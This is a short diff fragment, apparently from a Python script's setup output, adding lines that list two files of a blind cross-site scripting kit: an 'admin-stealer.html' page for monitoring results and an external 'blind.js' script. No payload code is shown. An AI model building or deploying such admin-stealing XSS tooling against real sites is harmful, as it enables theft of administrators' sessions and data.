+    print(f"   - admin-stealer.html: Monitor blind XSS results")
+    print(f"   - blind.js: External script for blind XSS")
     print("="*60)
